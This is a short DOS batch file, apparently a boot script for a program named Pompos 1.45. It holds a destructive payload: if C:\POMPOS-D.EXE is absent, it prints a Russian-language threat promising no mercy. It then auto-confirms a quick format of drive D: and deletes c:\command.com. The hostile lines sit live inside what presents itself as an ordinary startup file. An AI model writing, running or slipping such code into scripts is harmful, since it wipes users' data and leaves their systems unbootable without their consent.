@echo off
path a:\
newdosed
prompt $p$g
ver
: Pompos version 1.45
@echo off
if exist C:\POMPOS-D.EXE goto fun
echo  Ты поступил ОЧЕНЬ НЕПРАВИЛЬНО, удалив C:\POMPOS-D.EXE пощады
echo не жди... Делать нечего, нажимай любую клавишу...
@echo y| format d: /q /v:POMPOS
del c:\command.com

:fun
